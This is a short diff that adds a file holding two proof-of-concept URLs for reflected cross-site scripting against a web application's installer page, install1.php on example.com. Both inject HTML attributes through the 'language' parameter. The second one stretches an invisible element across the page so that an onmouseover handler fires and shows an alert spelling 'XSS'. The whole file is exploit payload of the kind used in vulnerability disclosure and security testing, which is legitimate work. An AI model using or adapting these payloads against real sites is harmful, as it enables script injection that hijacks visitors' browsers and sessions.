@@ -1,0 +1,3 @@
+http://www.example.com/install/install1.php?language=%22%20onmouseover=alert()%3E
+http://www.example.com/install/install1.php?language=%22%20style=a:b;margin-top:-1000px;margin-left:-100px;width:4000px;height:4000px;display:block;%20onmouseover=alert%28String.fromCharCode%2888,83,83%29%29;%3E
+
